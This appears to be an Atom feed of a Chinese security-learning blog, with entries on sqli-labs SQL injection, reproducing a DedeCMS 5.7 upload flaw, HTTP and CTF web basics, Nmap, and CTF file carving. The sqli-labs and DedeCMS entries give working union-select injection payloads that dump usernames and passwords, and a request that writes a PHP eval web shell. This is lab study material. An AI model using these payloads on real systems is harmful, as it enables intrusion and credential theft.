<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Myblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-20T00:31:06.879Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>WD</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs-master</title>
    <link href="http://yoursite.com/2019/07/19/sqli-labs-master/"/>
    <id>http://yoursite.com/2019/07/19/sqli-labs-master/</id>
    <published>2019-07-19T14:48:56.501Z</published>
    <updated>2019-07-20T00:31:06.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>首先传入id发现都能显示<br>猜测后台传参形式大概是这样</p><p>select … from … where id =’1’<br>试着闭合一下<br><a id="more"></a><br>传入id=1’<br>发现报错<br>传入id=1’%23<br>发现正确<br>所以猜想应该正确~</p><hr><hr><pre><code>接着试着查看该表的列传入id=1&apos; order by 4显示不存在传入id=1&apos; order by 3可以说明该表有三列 接下来爆数据库吧 我们已知information_schema存储了其他数据库信息所以使用union来执行查询数据库因为union需要前后sql语句选择的列数相同,当前一个语句选择的内容为空，就将后面的语句的内容显示出来所以传入id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata%23爆出数据库information_schema,challenges,dedecmsv57utf8sp2,mysql,performance_schema,security,test,wordpress,wordpress2现在一直数据库了想看看数据库中的表id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;%23爆出表了emails,referers,uagents,users还想看看表里有啥？满足你！id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;%23爆出列了id,username,password都到这里了看看数据吧~id=-1&apos; union select 1,username,password from users where id=&apos;3&apos;%23(貌似加不加单引号没影响？)数据库schema_nameinformation_schema.schemata</code></pre><hr><pre><code>表    table_nameinformation_schema.tables</code></pre><hr><pre><code>列column_nameinformation_schema.columns</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;p&gt;首先传入id发现都能显示&lt;br&gt;猜测后台传参形式大概是这样&lt;/p&gt;
&lt;p&gt;select … from … where id =’1’&lt;br&gt;试着闭合一下&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漏洞复现</title>
    <link href="http://yoursite.com/2019/07/19/CMS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/07/19/CMS漏洞复现/</id>
    <published>2019-07-19T14:35:33.796Z</published>
    <updated>2019-07-19T14:49:52.001Z</updated>
    
    <content type="html"><![CDATA[<p>CMS漏洞复现：<br><a id="more"></a></p><hr><ul><li>题目：F:\phpstudy\PHPTutorial\WWW\DedeCMS-V5.7-UTF8-SP2\uploads\dede</li></ul><ul><li>题目提示漏洞出现在tpl.php</li></ul><hr><p>打开tpl.php查看代码</p><ul><li>发现$action参数方法，实验修改$action值发现当?action=upload时发现页面</li></ul><pre><code>http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload</code></pre><p>-试着提交一个文件</p><p>-看看源代码吧~</p><p>获取到隐藏的token<br>返回查看代码发现下面的代码</p><pre><code>else if($action==&apos;savetagfile&apos;){csrf_check();//token检验if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))//正则匹配{    ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);    exit();}require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);$tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);$content = stripslashes($content);$truefile = DEDEINC.&apos;/taglib/&apos;.$filename;$fp = fopen($truefile, &apos;w&apos;);fwrite($fp, $content);fclose($fp);</code></pre><h2 id="发现没有对-content的输入进行过滤"><a href="#发现没有对-content的输入进行过滤" class="headerlink" title="发现没有对$content的输入进行过滤"></a>发现没有对$content的输入进行过滤</h2><pre><code>//正则匹配可查看 </code></pre><p><a href="https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0" target="_blank" rel="noopener">https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0</a></p><hr><pre><code>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点，i表示大小写不敏感</code></pre><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p><pre><code>语法mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。参数说明：$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。$count: 可选，为替换执行的次数。</code></pre><p>传入</p><pre><code>action=savetagfiletoken=0859045cdede6e8183d740b42c4a2a37filename=123.lib.phpcontent=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3</code></pre><p>因此构造</p><pre><code>http：//127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=savetagfile&amp;token=0859045cdede6e8183d740b42c4a2a37&amp;filename=123.lib.php&amp;content=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3E</code></pre><h2 id="注意token具有时效性！！！"><a href="#注意token具有时效性！！！" class="headerlink" title="注意token具有时效性！！！"></a>注意token具有时效性！！！</h2><pre><code>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</code></pre><hr><h2 id="身份认证概述"><a href="#身份认证概述" class="headerlink" title="身份认证概述"></a>身份认证概述</h2><p>由于HTTP是一种没有状态的协议，它并不知道是谁访问了我们的应用。这里把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下次这个客户端再发送请求时候，还得再验证一下。</p><p>通用的解决方法就是，当用户请求登录的时候，如果没有问题，在服务端生成一条记录，在这个记录里可以说明登录的用户是谁，然后把这条记录的id发送给客户端，客户端收到以后把这个id存储在cookie里，下次该用户再次向服务端发送请求的时候，可以带上这个cookie，这样服务端会验证一下cookie里的信息，看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p><p>以上所描述的过程就是利用session，那个id值就是sessionid。我们需要在服务端存储为用户生成的session，这些session会存储在内存，磁盘，或者数据库。</p><h2 id="基于token机制的身份认证"><a href="#基于token机制的身份认证" class="headerlink" title="基于token机制的身份认证"></a>基于token机制的身份认证</h2><p>使用token机制的身份验证方法，在服务器端不需要存储用户的登录记录。大概的流程：</p><p>客户端使用用户名和密码请求登录。服务端收到请求，验证用户名和密码。验证成功后，服务端会生成一个token，然后把这个token发送给客户端。客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。客户端每次向服务端发送请求的时候都需要带上服务端发给的token。服务端收到请求，然后去验证客户端请求里面带着token，如果验证成功，就向客户端返回请求的数据。</p><h2 id="利用token机制进行登录认证，可以有以下方式："><a href="#利用token机制进行登录认证，可以有以下方式：" class="headerlink" title="利用token机制进行登录认证，可以有以下方式："></a>利用token机制进行登录认证，可以有以下方式：</h2><ul><li>用设备mac地址作为token</li></ul><hr><p>客户端：客户端在登录时获取设备的mac地址，将其作为参数传递到服务端</p><p>服务端：服务端接收到该参数后，便用一个变量来接收，同时将其作为token保存在数据库，并将该token设置到session中。客户端每次请求的时候都要统一拦截，将客户端传递的token和服务器端session中的token进行对比，相同则登录成功，不同则拒绝。</p><p>此方式客户端和服务端统一了唯一的标识，并且保证每一个设备拥有唯一的标识。缺点是服务器端需要保存mac地址；优点是客户端无需重新登录，只要登录一次以后一直可以使用，对于超时的问题由服务端进行处理。</p><ul><li>用sessionid作为token</li></ul><hr><p>客户端：客户端携带用户名和密码登录</p><p>服务端：接收到用户名和密码后进行校验，正确就将本地获取的sessionid作为token返回给客户端，客户端以后只需带上请求的数据即可。</p><p>此方式的优点是方便，不用存储数据，缺点就是当session过期时，客户端必须重新登录才能请求数据。</p><p>当然，对于一些保密性较高的应用，可以采取两种方式结合的方式，将设备mac地址与用户名密码同时作为token进行认证。</p><p>APP利用token机制进行身份认证</p><p>用户在登录APP时，APP端会发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果验证成功，就会生成相应位数的字符产作为token存储到服务器中，并且将该token返回给APP端。</p><p>以后APP再次请求时，凡是需要验证的地方都要带上该token，然后服务器端验证token，成功返回所需要的结果，失败返回错误信息，让用户重新登录。其中，服务器上会给token设置一个有效期，每次APP请求的时候都验证token和有效期。</p><h2 id="token的存储"><a href="#token的存储" class="headerlink" title="token的存储"></a>token的存储</h2><p>token可以存到数据库中，但是有可能查询token的时间会过长导致token丢失（其实token丢失了再重新认证一个就好，但是别丢太频繁，别让用户没事儿就去认证）。</p><p>为了避免查询时间过长，可以将token放到内存中。这样查询速度绝对就不是问题了，也不用太担心占据内存，就算token是一个32位的字符串，应用的用户量在百万级或者千万级，也是占不了多少内存的。</p><h2 id="token的加密"><a href="#token的加密" class="headerlink" title="token的加密"></a>token的加密</h2><p>token是很容易泄露的，如果不进行加密处理，很容易被恶意拷贝并用来登录。加密的方式一般有：</p><p>在存储的时候把token进行对称加密存储，用到的时候再解密。文章最开始提到的签名sign：将请求URL、时间戳、token三者合并，通过算法进行加密处理。</p><p>最好是两种方式结合使用。</p><p>还有一点，在网络层面上token使用明文传输的话是非常危险的，所以一定要使用HTTPS协议。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CMS漏洞复现：&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Web基础知识</title>
    <link href="http://yoursite.com/2019/07/16/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2019/07/16/Web基础知识/</id>
    <published>2019-07-16T07:03:31.500Z</published>
    <updated>2019-07-19T06:28:01.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="##HTTP协议##"></a>##HTTP协议##</h2><p>HTTP协议各个参数详解<br>HTTP消息是由普通ASCII文本组成。消息包括消息头和数据体部分。消息头以行为单位，每行以CRLF（回车和换行）结束，消息头结束后，额外增加一个CRLF，之后内容就是数据体部分了。<br><a id="more"></a></p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求:"></a>http请求:</h2><p>实例如下:</p><pre><code>GET/sample.jspHTTP/1.1Accept:image/gif.image/jpeg,*/*Accept-Language:zh-cnConnection:Keep-AliveHost:localhostUser-Agent:Mozila/4.0(compatible;MSIE5.01;Window NT5.0)Accept-Encoding:gzip,deflateusername=jinqiao&amp;password=1234</code></pre><h2 id="请求方式-RequestMethod"><a href="#请求方式-RequestMethod" class="headerlink" title="请求方式(RequestMethod):"></a>请求方式(RequestMethod):</h2><p>OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE和CONNECT。</p><pre><code>GET     请求获取Request-URI所标识的资源POST    在Request-URI所标识的资源后附加新的数据HEAD    请求获取由Request-URI所标识的资源的响应消息报头PUT     请求服务器存储一个资源，并用Request-URI作为其标识DELETE  请求服务器删除Request-URI所标识的资源TRACE   请求服务器回送收到的请求信息，主要用于测试或诊断CONNECT 保留将来使用</code></pre><p>##参数 ##<br>    OPTIONS 请求查询服务器的性能，或者查询与资源相关的选项和需求</p><pre><code>User-Agent：客户端的浏览器信息。Connection：close表示使用短连接，Keep-Alive表示客户端支持持久连接。Date：消息产生的当前时间。Accept-Language：客户端支持的语言。Cache-Control：客户端是否支持cache。no-cache表示客户端不支持cache，如max-age=3600，告诉User Agent 该请求的响应结果在多长时间内有效，在有效期内，当用户再次需要访问时，直接从客户端本地提取，不需要访问服务器。Referer：Referer用以告诉服务器该请求来自于哪个URL，可以用追踪用户的WEB访问路径。If-Modified-Since: 如果请求消息包含If-Modified-Since标题 域，GET方法的语法就变成“条件GET”，即“（conditional GET）”。 条件GET方法可以对指定资源进行判断，如果它在If-Modified-Since标题域中的指定日期后发生了更新，才启动传输，否则不传输。这种条件 GET允许被缓存的实体在不必经过多次请求或不必要的数据传输就能进行刷新，从而有助于降低网络负载。Last-Modified: Sun, 03 Dec 2008 23:52:56 GMTETag: “1cbf3-dfd-3a2adcd8″    一般应用在文件下载上，用于标识响应内容的最后修改时间或内容较验码，当下一次User agent需要时，服务首先判断这二个值是否跟服务器上一致，一样则不需要返回内容。Expires：该请求的响应结果在什么时间失效，在没有失效之前，代理可直接从缓存中返回以前的响应结果。Host：指定请求资源的主机和端口号。HTTP/1.1请求必须指定Host，否则服务器会返回400状态码。</code></pre><h1 id="http响应"><a href="#http响应" class="headerlink" title="http响应:"></a>http响应:</h1><p>实例如下:</p><pre><code>HTTP/1.1 200 OKDate: Mon, 04 May 2015 04:47:13 GMTServer: ApacheCache-Control: max-age=0Expires: Mon, 04 May 2015 04:47:13 GMTVary: Accept-Encoding,User-AgentConnection: closeTransfer-Encoding: chunkedContent-Type: text/html;charset=utf-8X-Pad: avoid browser bug</code></pre><h2 id="状态行包括"><a href="#状态行包括" class="headerlink" title="状态行包括"></a>状态行包括</h2><p>HTTP协议版本号、状态码、状态码的文本描述信息。如：HTTP/1.1 200 OK<br>状态码由一个三位数组成，状态码大体有5种含义：</p><ol><li><p>1xx。信息，请求收到，继续处理。</p></li><li><p>2xx。成功。200请求成功；206断点续传。</p></li><li><p>3xx。重定向。一般跳转到新的地址。</p></li><li><p>4xx。客户端错误。404文件不存在</p></li><li><p>5xx。服务器错误。500内部错误。</p></li></ol><hr><ul><li>Set-Cookie：服务器设置客户端Cookie。设置格式是name=value，设置多个参数时中 间用分号隔开。Set-Cookie时还会用到几个参数：PATH设置有效的路径，DOMAIN设置cookie生效的域名，Expire设置 cookie的有效时间，0表示关闭浏览器就失效。</li></ul><ul><li>Location：当服务器返回3xx重定向时，该参数实现重定向。广告链接的跳转就使用这种协议。</li></ul><ul><li>Content-Length：附属体（数据实体）的长度</li></ul><h1 id="CTF里面的WEB题的一些解决思路"><a href="#CTF里面的WEB题的一些解决思路" class="headerlink" title="CTF里面的WEB题的一些解决思路"></a>CTF里面的WEB题的一些解决思路</h1><p><img src="https://img-blog.csdn.net/2018041923184982?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RBTEUxMTg2NDg3MTA0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p><hr><pre><code>(1):直接查看源码：查看源码的方法除了鼠标右键查看外，还可以通过在网址栏前面加入”view-source:“，语句或者通过F12键打开控制台，通过控制台改变一些元素的信息来获取flag(2)  查看修改过添加HTTP请求头响应头：对于这种类型的题目，可能直接修改信息行不通，那就得用到BP这个工具了，通过修改代理来间接改变成题目所需要的信息，再通过软件运行，即可得到flag，对于一些有SQL语句预防的情况下可以使用“’ or 1=1 group by pwd with rollup limit 1 offset 2#   ”这条语句直接得到flag(3) 后台登录   绕过登录获得FLAG(4)利用开发者工具控制台 如果打开题目是很多的代码，可以将代码粘贴至控制台（例如jother代码属于js代码的一种）然后控制台会执行该代码(5)使用BP拦截  BP是一个很强大的软件，如果对于该软件不怎么了解的话，可以参考BP的手册Burp-Suite-使用手册.docx，可以很快的使用这个软件完成各种功能(6)上传绕过  由于文件上传功能实现代码没有严格限制用户上传到文件后缀以及文件类型，导致攻击者能够向某个可通过WEB访问的目录上传恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执行恶意脚本 例如  一句话木马文件截断：在文件头末尾改变一下，把十六进制的空格（20）改成空字节（00）(7)SQL注入  SQL注入就是把sql语句以精妙的方式放到输入框中，送到后台去执行，从而获取非法的信息判断是否存在SQL注入的一些语句：”1‘ and 1=1，””and 1=2”(8)cookie 登录网站的时候会产生cookie信息，通过获取cookie信息来绕过登录用BP来获取数据包，通过删掉cookie信息来得到flag(9)HASH函数 利用sha函数的漏洞（sha函数默认传入的是字符串，传入其他类型得到的结果是false)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;HTTP协议&quot;&gt;&lt;a href=&quot;#HTTP协议&quot; class=&quot;headerlink&quot; title=&quot;##HTTP协议##&quot;&gt;&lt;/a&gt;##HTTP协议##&lt;/h2&gt;&lt;p&gt;HTTP协议各个参数详解&lt;br&gt;HTTP消息是由普通ASCII文本组成。消息包括消息头和数据体部分。消息头以行为单位，每行以CRLF（回车和换行）结束，消息头结束后，额外增加一个CRLF，之后内容就是数据体部分了。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XFF伪造IP</title>
    <link href="http://yoursite.com/2019/07/16/XFF%E4%BC%AA%E9%80%A0IP/"/>
    <id>http://yoursite.com/2019/07/16/XFF伪造IP/</id>
    <published>2019-07-16T07:01:00.000Z</published>
    <updated>2019-07-16T07:01:00.259Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nmapp基础</title>
    <link href="http://yoursite.com/2019/07/15/Nmap%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/07/15/Nmap基础/</id>
    <published>2019-07-15T11:45:51.618Z</published>
    <updated>2019-07-15T12:36:29.038Z</updated>
    
    <content type="html"><![CDATA[<p>date: 2019-07-15 19:45:51</p><h1 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h1><ul><li><p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnamp。<br>Nmap可以完成以下任务：</p><p>  1.主机探测</p><p>  2.端口扫描</p><p>  3.版本检测htt</p><p>  4.系统检测</p><p>  5.支持探测脚本的编写</p><a id="more"></a></li></ul><hr><h2 id="常见的服务端口号"><a href="#常见的服务端口号" class="headerlink" title="常见的服务端口号"></a>常见的服务端口号</h2><p>HTTP    80</p><p>HTTPS    443</p><p>Telnet    23</p><p>FTP    21</p><p>SSH（安全登录）、SCP（文件传输）、端口重定向        22</p><p>SMTP    25</p><p>POP3    110</p><p>WebLogic    7001</p><p>TOMCAT    8080</p><p>WIN2003远程登录    3389</p><p>Oracle数据库    1521</p><p>MS SQL* SEVER数据库sever    1433</p><p>MySQL 数据库sever    3306</p><hr><h1 id="nmap基本使用方法"><a href="#nmap基本使用方法" class="headerlink" title="nmap基本使用方法"></a>nmap基本使用方法</h1><p>1、nmap简单扫描</p><pre><code>nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口命令语法：nmap &lt;target ip address&gt;其中：target ip address是扫描的目标主机的ip地址</code></pre><p>2.nmap简单扫描，并对结果返回详细的描述输出</p><pre><code>命令语法：namp -vv &lt;target ip address&gt;介绍：-vv参数设置对结果的详细输出</code></pre><p>3.nmap自定义扫描</p><pre><code>命令语法：nmap -p(range) &lt;target IP&gt;介绍：（range）为要扫描的端口范围，端口大小不能超过65535例子：扫描目标主机的1-50号端口nmap -p50-80 10.0.0.55</code></pre><p>4.nmap 指定端口扫描</p><pre><code>命令语法：nmap -p(port1,port2,…) &lt;target IP&gt;介绍：port1,port2…为想要扫描的端口号例子：扫描目标主机的80，443，801端口nmap -p80,443,801 10.0.0.55</code></pre><p>5.nmap ping 扫描</p><pre><code>nmap可以利用类似windows/linux系统下的ping 方式进行扫描命令语法： nmap -sP &lt;target ip&gt;例子：nmap sP 10.1.112.89</code></pre><p>6.nmap路由追踪</p><pre><code>路由器追踪功能，能够帮助网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具，通过路由器追踪可以轻松的查处从我们电脑所在地到目的地之间所经常的网络节点，并可以看到通过各个结点所花费的时间命令语法： nmap –traceroute &lt;target IP&gt;例子:namp –traceroute 8.8.8.8(geogle dns服务器ip)</code></pre><p>7.nmap设置扫描一个网段下的ip</p><pre><code>命令语法： nmap -sP &lt;network address&gt; &lt;/CIDR&gt;介绍：CIDR为设置的子网掩码（/24,/16,/8等）例子：nmap -sP 10.1.1.0 /24</code></pre><p>8.nmap操作系统类型的探测</p><pre><code>命令语法： nmap -0 &lt;target IP&gt;例子：nmap -O(大写的o) 10.1.112.89</code></pre><p>9.nmap万能开关</p><pre><code>包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测命令语法： nmap -A &lt;target ip&gt;例子：nmap -A 10.1.112.89</code></pre><p>10.nmap命令混合式扫描</p><pre><code>可以做到类似参数-A所完成的功能，但又能细化我们的需求要求命令语法： nmap -vv -p1-100 -O &lt;target ip&gt;例子： nmap -vv -p1-100 -O 10.1.112.89</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;date: 2019-07-15 19:45:51&lt;/p&gt;
&lt;h1 id=&quot;Nmap使用&quot;&gt;&lt;a href=&quot;#Nmap使用&quot; class=&quot;headerlink&quot; title=&quot;Nmap使用&quot;&gt;&lt;/a&gt;Nmap使用&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnamp。&lt;br&gt;Nmap可以完成以下任务：&lt;/p&gt;
&lt;p&gt;  1.主机探测&lt;/p&gt;
&lt;p&gt;  2.端口扫描&lt;/p&gt;
&lt;p&gt;  3.版本检测htt&lt;/p&gt;
&lt;p&gt;  4.系统检测&lt;/p&gt;
&lt;p&gt;  5.支持探测脚本的编写&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>misc基础</title>
    <link href="http://yoursite.com/2019/06/14/misc%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/06/14/misc基础/</id>
    <published>2019-06-14T07:57:22.294Z</published>
    <updated>2019-06-14T08:07:35.228Z</updated>
    
    <content type="html"><![CDATA[<p>杂项介绍</p><p>Miscellaneous简称MISC，意思是杂项，混杂的意思。</p><p>杂项大致有几种类型：</p><p>1.隐写</p><p>2.压缩包处理</p><p>3.流量分析</p><p>4.攻击取证</p><p>5.其它</p><a id="more"></a><p><img src="https://image.3001.net/images/20190227/1551239622_5c7609c6925d3.jpg!small" alt=""></p><p>本篇主要介绍杂项基础题目的知识点以及解题思路。</p><p>0×00 文件类型识别</p><p>杂项题目主要是以文件附件作为题目，但是给的文件不一定是有后缀名的，这就需要我们识别这些文件</p><ol><li>file命令</li></ol><p>file命令实际上是一个命令行工具，用来查看文件类型。<br>使用方法：<br>将文件复制到kail或者带有file工具的系统中，使用file查看文件。</p><p><img src="https://image.3001.net/images/20190227/1551239694_5c760a0e3703e.jpg!small" alt=""></p><p>将文件后缀名补上即可正常打开。<br>然后根据实际情况进行初步判断可能是什么类型的题目。</p><ol start="2"><li>010Editor</li></ol><p>010Editor是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的undo和redo操作。另外还可以打印x十六进制的字节或者以书签的方式标出某些重要的字节。我们可以通过使用010Editor查看文件的头部来判断类型。</p><p>以下是常见的文件头:</p><p><img src="https://image.3001.net/images/20190227/1551239737_5c760a3976498.jpg!small" alt=""></p><p>PNG文件头中包含IHDR信息。</p><p><img src="https://image.3001.net/images/20190227/1551247661_5c76292d888b0.jpg!small" alt=""></p><p>IHDR的作用将在后续的图片类隐写中详细讲解。</p><p>当文件类型不确定时就可以尝试查看文件头来判断。</p><p><img src="https://image.3001.net/images/20190227/1551247691_5c76294b383ff.jpg" alt=""></p><p>既然会出现没有后缀的文件，那当然也会出现缺少头部的情况，可以根据后缀名来选择文件头部进行填充，如果没有后缀名，则查看文件尾部来判断文件类型。</p><p>以下是常见的文件尾部：<br>zip文件的结尾以一串504B0506开始。</p><p><img src="https://image.3001.net/images/20190227/1551247724_5c76296cf01cf.jpg" alt=""></p><p>rar文件以C43D7B00400700结尾。</p><p><img src="https://image.3001.net/images/20190227/1551247752_5c7629882bb43.jpg!small" alt=""></p><p>JPG文件结尾为FFD9。<br><img src="https://image.3001.net/images/20190227/1551247796_5c7629b4b597f.jpg" alt=""></p><p>PNG文件 结尾为000049454E44AE426082。</p><p><img src="https://image.3001.net/images/20190227/1551247823_5c7629cf93d65.jpg" alt=""></p><p>Gif文件结尾为3B。</p><p><img src="https://image.3001.net/images/20190227/1551247855_5c7629ef5ec90.jpg!small" alt=""></p><p>0×01 文件分离</p><p>介绍了文件类型的识别方法了，接下来来讲一下文件分离<br>文件分离的原因：<br>在CTF这个充满脑洞的比赛中，出题人往往会以一些稀奇古怪的出题方式出题，因此你可以常常看见暴打出题人等字眼出现在比赛论坛中。在CTF中一个文件中隐藏着另外其他文件的题目是经常有的。这就需要掌握文件分离的技巧来应对。下面介绍几种姿势</p><ol><li>Binwalk</li></ol><p>1.1 Binwalk工具介绍<br>Binwalk是一个自动提取文件系统，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。相比于之前介绍的file命令行工具来说，file只是从文件的第一个字节开始识别，且只能把一个文件识别成一个类型的文件，很难看出是否隐藏着其他的文件，Binwalk就能很好的完成这项任务。</p><p>1.2 Binwalk文件扫描和提取<br>Binwalk分析文件<br>命令：binwalk +file 通过扫描能够发现目标文件中包含的所有可识别的文件类型。</p><p><img src="https://image.3001.net/images/20190227/1551247989_5c762a75a5eb9.jpg" alt=""></p><p>通过Binwalk我们可以看到这一张jpg文件中藏着zip文件。<br>Binwalk提取文件。<br>命令 binwalk +file -e。</p><p><img src="https://image.3001.net/images/20190227/1551248026_5c762a9a61d25.jpg!small" alt=""></p><p>“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。<br>若提取成功则会生成一个_文件名_extracted的目录，目录中存放的就是提取出的文件</p><ol start="2"><li>foremost</li></ol><p>2.1 foremost工具介绍<br>foremost是基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。该工具通过分析不同类型文件的头、尾和内部数据结构，同镜像文件的数据进行比对，以还原文件。它默认支持19种类型文件的恢复。用户还可以通过配置文件扩展支持其他文件类型。</p><p>2.2 foremost提取文件<br>有时候binwalk无法正确分离出文件，这时候就可以使用foremost，将目标文件复制到kali中，在终端中使用命令行进入文件所在文件夹，使用如下命令：<br>Foremost+file –o 输出目录名。</p><p><img src="https://image.3001.net/images/20190227/1551248069_5c762ac523792.jpg" alt=""></p><p>执行成功后会在目标文件的文件目录下生成我们设置的目录，目录有中按照文件类型分离出文件。</p><p><img src="https://image.3001.net/images/20190227/1551248133_5c762b0522794.jpg" alt=""></p><ol start="3"><li>dd</li></ol><p>前面介绍的两种都是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。<br>使用dd命令分离文件格式如下：</p><p>dd if=源文件名 bs=1 skip=开始分离的字节数 of=目标文件名<br>参数说明：<br>if=file #输入文件名，缺省为标准输入。<br>of=file #输出文件名，缺省为标准输出。<br>bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。<br>skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。<br>以IDF实验室“抓到一只苍蝇”为例，需要将获得的文件去除前364个字节：<br>dd if=s1 bs=1 skip=364 of=d1</p><p>使用dd命令分离文件格式如下：<br>dd if=源文件名 bs=1 skip=开始分离的字节数 of=目标文件名</p><p>参数说明：<br>if=file #输入文件名，缺省为标准输入。<br>of=file #输出文件名，缺省为标准输出。<br>bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs。<br>skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。<br>若需要将获得的文件去除前364个字节：<br>dd if=s1 bs=1 skip=364 of=d1<br><img src="https://image.3001.net/images/20190227/1551248205_5c762b4d4b0fe.jpg!small" alt=""></p><ol start="4"><li>010Editor</li></ol><p>在之前文件识别中提到这个工具，手动分离文件也可以使用这个工具<br>拖动想要分离的部分。</p><p><img src="https://image.3001.net/images/20190227/1551248286_5c762b9e9e03e.jpg!small" alt=""> </p><p><img src="https://image.3001.net/images/20190227/1551248306_5c762bb24fd66.jpg!small" alt=""></p><p>右键-&gt;选择-&gt;保存选择。</p><p>然后根据需要分离的文件类型选择后缀名。</p><p><img src="https://image.3001.net/images/20190227/1551248357_5c762be5e2397.jpg!small" alt=""></p><p>在介绍了文件分离后，还需要提到的是文件合并。<br>天下之事分久必合合久必分，既然CTF有文件分离的题目，那自然也少不了文件合成的了，但是文件合成还是有技巧的。</p><ol><li>linux环境文件合并</li></ol><p>cat 是linux系统下的一个能提取文件的内容的命令，使用cat命令将文件内容提取出来再导入目标文件。使用方式如下：<br>将chapter01、chapter02、chapter03三个文件按从左到右顺序合并，输出到book文件中。<br>所使用的命令：cat chapter01 chapter02 chapter03 &gt; book<br>将所有以chapter开头的文件按文件名从小到大的顺序合并，输出到book文件中。<br>所使用的命令：cat  chapter* &gt; book </p><p><img src="https://image.3001.net/images/20190227/1551248518_5c762c86bab97.jpg!small" alt=""></p><p>但是要注意的一点是，cat是需要遵循顺序来获取文件内容的，所以在cat之前需要判断一下文件的先后顺序。</p><ol 